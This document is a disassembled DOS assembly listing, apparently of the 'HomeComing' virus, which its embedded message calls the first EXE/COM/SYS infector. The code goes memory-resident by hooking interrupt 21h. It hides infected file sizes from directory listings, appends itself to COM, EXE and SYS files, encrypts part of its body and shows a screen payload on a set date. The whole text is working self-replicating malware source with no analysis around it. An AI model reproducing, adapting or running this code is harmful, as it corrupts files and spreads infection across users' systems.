movSeg       macro reg16, unused, Imm16     ; Fixup for Assembler
         ifidn  , 
         db 0BBh
         endif
         ifidn  , 
         db 0B9h
         endif
         ifidn  , 
         db 0BAh
         endif
         ifidn  , 
         db 0BEh
         endif
         ifidn  , 
         db 0BFh
         endif
         ifidn  , 
         db 0BDh
         endif
         ifidn  , 
         db 0BCh
         endif
         ifidn  , 
         db 0BBH
         endif
         ifidn  , 
         db 0B9H
         endif
         ifidn  , 
         db 0BAH
         endif
         ifidn  , 
         db 0BEH
         endif
         ifidn  , 
         db 0BFH
         endif
         ifidn  , 
         db 0BDH
         endif
         ifidn  , 
         db 0BCH
         endif
         dw seg Imm16
endm
data_1e     equ 84h         ; (0000:0084=1492h)
data_2e     equ 86h         ; (0000:0086=0CF42h)
data_3e     equ 63h         ; (0040:0063=3D4h)
data_4e     equ 0           ; (48F3:0000=0FFh)
data_5e     equ 1           ; (48F3:0001=0FFFFh)
data_30e    equ 9Eh         ; (B000:009E=0FFh)
data_31e    equ 31Eh            ; (B000:031E=0FFh)
  
seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a
  
  
        org 100h
  
homecmng    proc    far
  
start:
        jmp loc_1           ; (0115)
        add [bx+si],al
        sub al,0Ch
        add byte ptr ds:[154h][bx+si],al    ; (741D:0154=0)
        db   65h, 01h, 20h
        db  7 dup (20h)
loc_1:
        call    sub_2           ; (0118)
  
homecmng    endp
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_2       proc    near
        pop bp
        sub bp,15h
        nop             ;*ASM fixup - sign extn byte
        push    es
        push    ds
        call    sub_13          ; (061B)
        call    sub_4           ; (024A)
        jz  loc_2           ; Jump if zero
        mov cs:data_27[bp],3    ; (741D:055D=532h)
        mov ah,4Ah          ; 'J'
        mov bx,0FFFFh
        int 21h         ; DOS Services  ah=function 4Ah
                        ;  change mem allocation, bx=siz
        sub bx,59h
        mov ah,4Ah          ; 'J'
        int 21h         ; DOS Services  ah=function 4Ah
                        ;  change mem allocation, bx=siz
        jc  loc_2           ; Jump if carry Set
        mov ah,48h          ; 'H'
        mov bx,58h
        int 21h         ; DOS Services  ah=function 48h
                        ;  allocate memory, bx=bytes/16
        jc  loc_2           ; Jump if carry Set
        mov es,ax
        dec ax
        mov ds,ax
        mov byte ptr ds:data_4e,5Ah ; (48F3:0000=0FFh) 'Z'
        nop             ;*ASM fixup - sign extn byte
        mov word ptr ds:data_5e,8   ; (48F3:0001=0FFFFh)
        push    cs
        pop ds
        mov cx,2BBh
        lea si,[bp+0]       ; Load effective addr
        nop             ;*ASM fixup - displacement
        nop             ;*ASM fixup - sign extn byte
        xor di,di           ; Zero register
        rep movsw           ; Rep when cx >0 Mov [si] to es:[di]
        mov ax,1BAh
        call    sub_3           ; (022B)
loc_2:
        mov ah,2Ah          ; '*'
        int 21h         ; DOS Services  ah=function 2Ah
                        ;  get date, cx=year, dx=mon/day
        cmp dl,10h
        jne loc_3           ; Jump if not equal
        or  al,al           ; Zero ?
        jnz loc_3           ; Jump if not zero
        xor ax,ax           ; Zero register
        mov bx,435Ah
        int 21h         ; DOS Services  ah=function 00h
                        ;  terminate, cs=progm seg prefx
        cmp bx,4852h
loc_3:
        jne loc_13          ; Jump if not equal
        cli             ; Disable interrupts
        push    cs
        pop ds
        mov dx,0B800h
        mov ax,40h
        mov es,ax
        cmp word ptr es:data_3e,3D4h    ; (0040:0063=3D4h)
        je  loc_4           ; Jump if equal
        mov dh,0B0h
loc_4:
        mov es,dx
loc_5:
        inc dx
        cmp dl,4Fh          ; 'O'
        jg  loc_11          ; Jump if >
        mov di,data_31e     ; (B000:031E=0FFh)
        mov cl,dl
        xor ch,ch           ; Zero register
        shl cx,1            ; Shift w/zeros fill
        sub di,cx
        shr cx,1            ; Shift w/zeros fill
        lea si,[bp+369h]        ; Load effective addr
        lea bx,[bp+39Eh]        ; Load effective addr
  
locloop_6:
        mov ax,3534h
        cmp dh,0B8h
        je  loc_7           ; Jump if equal
        mov ax,7071h
loc_7:
        cmp bx,si
        jg  loc_8           ; Jump if >
        xor ax,ax           ; Zero register
loc_8:
        push    ax
        push    cx
        mov cx,3
  
locloop_9:
        lodsb               ; String [si] to al
        stosw               ; Store ax to es:[di]
        add si,34h
        add di,data_30e     ; (B000:009E=0FFh)
        loop    locloop_9       ; Loop if cx > 0
  
        pop cx
        pop ax
        xchg    ah,al
        lodsb               ; String [si] to al
        stosw               ; Store ax to es:[di]
        sub si,9Fh
        sub di,1E0h
        loop    locloop_6       ; Loop if cx > 0
  
  
locloop_10:
        loop    locloop_10      ; Loop if cx > 0
  
        jmp short loc_5     ; (019C)
loc_11:
        mov cx,64h
        sti             ; Enable interrupts
  
locloop_12:
        xor ah,ah           ; Zero register
        int 16h         ; Keyboard i/o  ah=function 00h
                        ;  get keybd char in al, ah=scan
        loop    locloop_12      ; Loop if cx > 0
  
loc_13:
        pop ds
        pop es
        cmp sp,0FFFEh
        je  loc_14          ; Jump if equal
        cli             ; Disable interrupts
        mov ax,ds
        add ax,10h
        add word ptr cs:[117h][bp],ax   ; (741D:0117=5D00h)
        add ax,word ptr cs:[119h][bp]   ; (741D:0119=0ED81h)
        mov ss,ax
        mov sp,word ptr cs:[11Bh][bp]   ; (741D:011B=15h)
        sti             ; Enable interrupts
        push    ds
        pop es
;*      jmp far ptr loc_33      ;*(FF20:CD90)
        db  0EAh, 90h,0CDh, 20h,0FFh
        db  0FFh,0FFh,0FFh,0FFh
loc_14:
        lea si,[bp+115h]        ; Load effective addr
        mov di,offset ds:[100h] ; (741D:0100=0E9h)
        push    di
        movsw               ; Mov [si] to es:[di]
        movsb               ; Mov [si] to es:[di]
        retn
sub_2       endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_3       proc    near
        push    si
        push    di
        cld             ; Clear direction
        push    ax
        mov di,ax
        sub di,0FFD2h
        xor ax,ax           ; Zero register
        mov ds,ax
        mov si,data_1e      ; (0000:0084=92h)
        movsw               ; Mov [si] to es:[di]
        movsw               ; Mov [si] to es:[di]
        pop ax
        cli             ; Disable interrupts
        mov ds:data_1e,ax       ; (0000:0084=1492h)
        mov ds:data_2e,es       ; (0000:0086=0CF42h)
        sti             ; Enable interrupts
        pop di
        pop si
        retn
sub_3       endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_4       proc    near
        mov ax,0CF0h
        mov bx,4441h
        int 21h         ; DOS Services  ah=function 0Ch
                        ;  clear keybd buffer & input al
        cmp bx,4748h
        retn
sub_4       endp
  
        db   55h,0E8h, 00h, 00h
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_5       proc    near
        pop bp
        mov word ptr cs:[406h][bp],es   ; (741D:0406=6D81h)
        mov word ptr cs:[408h][bp],bx   ; (741D:0408=321Dh)
        pop bp
        retf                ; Return far
sub_5       endp
  
        db   1Eh, 06h,0E8h, 00h, 00h
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_6       proc    near
        pop bp
        sub bp,16Ah
        push    cs
        pop ds
        mov es,word ptr ds:data_27+1[bp]    ; (741D:055E=0E905h)
        mov di,ds:data_29[bp]   ; (741D:0560=0C181h)
        mov word ptr es:[di+3],8103h
        cmp byte ptr es:[di+2],0
        jne loc_15          ; Jump if not equal
        mov es:[di+10h],cs
        mov es:[di+0Eh],bp
        dec byte ptr es:[di+3]
        call    sub_4           ; (024A)
        jz  loc_15          ; Jump if zero
        call    sub_13          ; (061B)
        mov byte ptr cs:data_27[bp],3   ; (741D:055D=32h)
        lea ax,[bp+1BAh]        ; Load effective addr
        add word ptr es:[di+0Eh],574h
        mov word ptr es:[di+3],100h
        push    cs
        pop es
        call    sub_3           ; (022B)
loc_15:
        pop es
        pop ds
        retf
sub_6       endp
  
        pushf               ; Push flags
        or  ax,ax           ; Zero ?
        jnz loc_17          ; Jump if not zero
        cmp bx,435Ah
        jne loc_19          ; Jump if not equal
        push    bp
        call    sub_7           ; (02CC)
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_7       proc    near
        pop bp
        dec byte ptr cs:[394h][bp]  ; (741D:0394=0B6h)
        jnz loc_16          ; Jump if not zero
        mov bx,4852h
loc_16:
        pop bp
        popf                ; Pop flags
        iret                ; Interrupt return
sub_7       endp
  
loc_17:
        cmp ax,0CF0h
        jne loc_19          ; Jump if not equal
        cmp bx,4441h
        jne loc_19          ; Jump if not equal
        mov bx,4748h
        popf                ; Pop flags
  
loc_ret_18:
        iret                ; Interrupt return
loc_19:
;*      call    far ptr sub_1       ;*(002A:40EB)
        db   9Ah,0EBh, 40h, 2Ah, 00h
        pushf               ; Push flags
        cld             ; Clear direction
        push    bp
        push    ax
        mov bp,sp
        mov ax,[bp+4]
        mov [bp+0Ah],ax
        pop ax
        pop bp
        popf                ; Pop flags
        cmp ah,11h
        je  loc_20          ; Jump if equal
        cmp ah,12h
        jne loc_ret_18      ; Jump if not equal
loc_20:
        push    bp
        call    sub_8           ; (030C)
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_8       proc    near
        pop bp
        sub bp,209h
        push    ax
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    si
        push    di
        cmp al,0FFh
        je  loc_22          ; Jump if equal
        mov ah,2Fh          ; '/'
        int 21h         ; DOS Services  ah=function 2Fh
                        ;  get DTA ptr into es:bx
        push    es
        pop ds
        cmp byte ptr [bx],0FFh
        jne loc_21          ; Jump if not equal
        add bx,7
loc_21:
        les cx,dword ptr [bx+1Dh]   ; Load 32 bit ptr
        mov cs:data_25[bp],cx   ; (741D:0559=2EA4h)
        mov word ptr cs:data_25+2[bp],es    ; (741D:055B=86C6h)
        push    ds
        push    bx
        push    cs
        pop es
        lea di,[bp+54Ch]        ; Load effective addr
        push    di
        lea si,[bx+1]       ; Load effective addr
        mov cx,8
        call    sub_14          ; (062C)
        mov al,2Eh          ; '.'
        stosb               ; Store al to es:[di]
        lea si,[bx+9]       ; Load effective addr
        push    di
        mov cl,3
        call    sub_14          ; (062C)
        xor al,al           ; Zero register
        stosb               ; Store al to es:[di]
        pop di
        push    cs
        pop ds
        pop bx
        pop dx
        pop es
        cmp word ptr [bx],4F43h
loc_22:
        je  loc_26          ; Jump if equal
        mov cx,[di]
        mov al,[di+2]
        cmp cx,5953h
        je  loc_24          ; Jump if equal
        cmp cx,5845h
        je  loc_23          ; Jump if equal
        cmp cx,4F43h
        jne loc_26          ; Jump if not equal
        cmp al,4Dh          ; 'M'
        jne loc_26          ; Jump if not equal
        cmp word ptr [bx],4249h
        je  loc_26          ; Jump if equal
        lea si,[bp+289h]        ; Load effective addr
        jmp short loc_27        ; (03C1)
        db   03h, 3Dh, 04h
loc_23:
        cmp al,45h          ; 'E'
        jne loc_26          ; Jump if not equal
        lea si,[bp+296h]        ; Load effective addr
        jmp short loc_27        ; (03C1)
        db   1Ah, 8Eh, 04h
loc_24:
        cmp al,53h          ; 'S'
        jne loc_26          ; Jump if not equal
        cmp word ptr [bx],534Dh
        je  loc_26          ; Jump if equal
        cmp word ptr [bx],4F49h
        je  loc_26          ; Jump if equal
        lea si,[bp+2AFh]        ; Load effective addr
        jmp short loc_27        ; (03C1)
        db   02h, 68h, 04h
loc_25:
        pop ax
        pop ax
loc_26:
        pop di
        pop si
        pop es
        pop ds
        pop dx
        pop cx
        pop bx
        pop ax
        pop bp
        iret                ; Interrupt return
loc_27:
        push    dx
        push    es
        mov ax,4300h
        lea dx,[bp+54Ch]        ; Load effective addr
        int 21h         ; DOS Services  ah=function 43h
                        ;  get/set file attrb, nam@ds:dx
        jc  loc_25          ; Jump if carry Set
        push    cx
        push    dx
        xor al,al           ; Zero register
        call    sub_11          ; (0610)
        mov ax,5700h
        int 21h         ; DOS Services  ah=function 57h
                        ;  get/set file date & time
        push    cx
        push    dx
        lodsb               ; String [si] to al
        cbw             ; Convrt byte to word
        xchg    ax,cx
        push    cx
        mov ah,3Fh          ; '?'
        lea dx,[bp+532h]        ; Load effective addr
        int 21h         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        push    ds
        pop es
        lodsw               ; String [si] to ax
        lea si,[bp+0]       ; Load effective addr
        nop             ;*ASM fixup - displacement
        nop             ;*ASM fixup - sign extn byte
        lea di,[bp+562h]        ; Load effective addr
        mov cx,12h
        rep movsb           ; Rep when cx >0 Mov [si] to es:[di]
        xchg    ax,bx
        add bx,bp
        call    bx          ;*
        jnc loc_28          ; Jump if carry=0
        call    sub_9           ; (0604)
        sub word ptr [di+1Dh],532h
        sbb word ptr [di+1Fh],0
        jmp short loc_26        ; (03B7)
loc_28:
        lea dx,[bp+54Ch]        ; Load effective addr
        mov ax,4301h
        xor cx,cx           ; Zero register
        int 21h         ; DOS Services  ah=function 43h
                        ;  get/set file attrb, nam@ds:dx
        call    sub_10          ; (060E)
        lea dx,[bp+532h]        ; Load effective addr
        pop cx
        mov ah,40h          ; '@'
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        mov ax,4202h
        xor cx,cx           ; Zero register
        cwd             ; Word to double word
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        lea dx,[bp+562h]        ; Load effective addr
        mov cx,12h
        mov ah,40h          ; '@'
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        call    sub_12          ; (0616)
        lea dx,[bp+12h]     ; Load effective addr
        nop             ;*ASM fixup - displacement
        mov cx,520h
        mov ah,40h          ; '@'
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        call    sub_13          ; (061B)
        mov ax,5701h
        pop dx
        pop cx
        int 21h         ; DOS Services  ah=function 57h
                        ;  get/set file date & time
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        mov ax,4301h
        pop cx
        pop dx
        int 21h         ; DOS Services  ah=function 43h
                        ;  get/set file attrb, nam@ds:dx
        pop ax
        pop ax
        jmp loc_26          ; (03B7)
sub_8       endp
  
        db   80h, 5Dh, 44h, 41h
        db  '/PS]', 0
        db  '     Blow mah chunx, bruthah! Yo'
        db  'u', 27h, 've been hit by      Ho'
        db  'meComing, the world', 27h, 's fi'
        db  'rst EXE/COM/SYS infector!       '
        db  'Dedicated to Hellraiser of PHALC'
        db  'ON/SKISM                 Press a'
        db  'ny 100'
data_16     dw  6B20h           ; Data table (indexed access)
        db  'eys to continu'
data_17     dw  2E65h           ; Data table (indexed access)
data_18     dw  2E2Eh           ; Data table (indexed access)
data_19     dw  2020h           ; Data table (indexed access)
        db   20h, 20h
data_20     dw  2020h           ; Data table (indexed access)
        db   20h, 20h, 20h, 20h
data_21     dw  8B2Eh           ; Data table (indexed access)
data_22     dw  598Eh           ; Data table (indexed access)
        db   05h, 81h
data_23     dw  23E9h           ; Data table (indexed access)
data_24     dw  2E05h           ; Data table (indexed access)
        db   3Bh, 8Eh, 33h, 05h, 74h, 23h
        db   8Dh,0B6h, 32h, 05h, 8Dh,0BEh
        db   15h, 01h,0A5h
data_25     dw  2EA4h, 86C6h        ; Data table (indexed access)
data_27     dw  532h            ; Data table (indexed access)
        db  0E9h
data_29     dw  0C181h          ; Data table (indexed access)
        db   32h, 05h, 2Eh, 89h, 8Eh, 33h
        db   05h,0F8h,0C3h, 2Eh, 83h,0BEh
        db   32h, 05h,0FFh, 74h, 02h
loc_29:
        stc             ; Set carry flag
        retn
        mov cx,cs:data_25[bp]   ; (741D:0559=2EA4h)
        mov cs:data_17[bp],cx   ; (741D:0532=2E65h)
        lea di,[bp+568h]        ; Load effective addr
        add cx,154h
        mov [di],cx
        add cx,11h
        mov [di+2],cx
        clc             ; Clear carry flag
        retn
        cmp cs:data_22[bp],444Dh    ; (741D:0542=598Eh)
        je  loc_29          ; Jump if equal
        lea di,[bp+115h]        ; Load effective addr
        lea si,[bp+546h]        ; Load effective addr
        movsw               ; Mov [si] to es:[di]
        movsw               ; Mov [si] to es:[di]
        sub si,0Ah
        movsw               ; Mov [si] to es:[di]
        movsw               ; Mov [si] to es:[di]
        mov ax,cs:data_20[bp]   ; (741D:053A=2020h)
        mov cl,4
        shl ax,cl           ; Shift w/zeros fill
        xchg    ax,bx
        les ax,dword ptr cs:data_25[bp] ; (741D:0559=2EA4h) Load 32 bit ptr
        mov dx,es
        push    dx
        push    ax
        sub ax,bx
        sbb dx,0
        mov cx,10h
        div cx          ; ax,dx rem=dx:ax/reg
        mov cs:data_23[bp],dx   ; (741D:0546=23E9h)
        mov cs:data_24[bp],ax   ; (741D:0548=2E05h)
        add cs:data_23[bp],12h  ; (741D:0546=23E9h)
        mov cs:data_21[bp],ax   ; (741D:0540=8B2Eh)
        mov cs:data_22[bp],444Dh    ; (741D:0542=598Eh)
        pop ax
        pop dx
        add ax,532h
        adc dx,0
        mov cl,9
        push    ax
        shr ax,cl           ; Shift w/zeros fill
        ror dx,cl           ; Rotate
        stc             ; Set carry flag
        adc dx,ax
        pop ax
        and ah,1
        mov cs:data_19[bp],dx   ; (741D:0536=2020h)
        mov cs:data_18[bp],ax   ; (741D:0534=2E2Eh)
        clc             ; Clear carry flag
        retn
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_9       proc    near
        pop bx
        pop ax
        pop ax
        pop ax
        pop ax
        pop ax
        pop ds
        pop di
        push    bx
        retn
sub_9       endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_10      proc    near
        mov al,2
  
;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_11:
        mov ah,3Dh          ; '='
        int 21h         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        xchg    ax,bx
        retn
sub_10      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_12      proc    near
        add cs:data_16[bp],di   ; (741D:0522=6B20h)
  
;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_13:
        lea si,[bp+360h]        ; Load effective addr
        mov cx,6Eh
  
locloop_30:
        xor word ptr cs:[si],680h
        inc si
        inc si
        loop    locloop_30      ; Loop if cx > 0
  
        retn
sub_12      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_14      proc    near
  
locloop_31:
        cmp byte ptr [si],20h   ; ' '
        je  loc_ret_32      ; Jump if equal
        movsb               ; Mov [si] to es:[di]
        loop    locloop_31      ; Loop if cx > 0
  
  
loc_ret_32:
        retn
sub_14      endp
  
        db  0F0h,0A0h,0A3h,0A2h,0A3h
  
seg_a       ends
  
  
  
        end start
        